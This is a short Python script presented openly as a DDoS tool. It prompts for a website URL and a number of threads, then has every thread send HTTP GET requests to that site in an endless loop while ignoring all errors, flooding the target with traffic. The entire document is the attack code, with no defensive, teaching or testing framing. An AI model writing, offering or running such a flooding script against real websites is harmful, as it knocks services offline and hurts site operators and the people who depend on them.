import requests
import threading

def send_request(url):
    try:
        while True:
            response = requests.get(url)
            print("\033[1;31mDD0s Attack Rubish")
    except:
        pass

def start_ddos(url, num_threads):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url,))
        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    website_url = input("Enter the website URL: ")
    num_threads = int(input("Enter the number of thread you want to send to the website: "))

    start_ddos(website_url, num_threads)
